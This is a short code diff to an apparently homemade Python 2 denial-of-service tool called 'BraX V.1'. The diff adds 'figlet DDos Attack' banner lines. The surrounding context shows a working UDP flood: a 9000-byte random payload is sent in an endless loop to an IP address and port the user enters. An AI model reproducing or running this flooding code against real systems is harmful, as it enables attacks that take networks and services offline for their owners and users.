@@ -12,6 +12,7 @@ bytes = random._urandom(9000)
 #############
 
 	os.system("clear")
+	os.system("figlet DDos Attack")
 	print "#############################"
 	print "#         BraX V.1          #"
 	print "#############################"
@@ -25,6 +26,7 @@ ip = raw_input("IP : ")
 port = input("Port : ") 
 	
 os.system("clear")
+os.system("figlet DDos Attack")
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
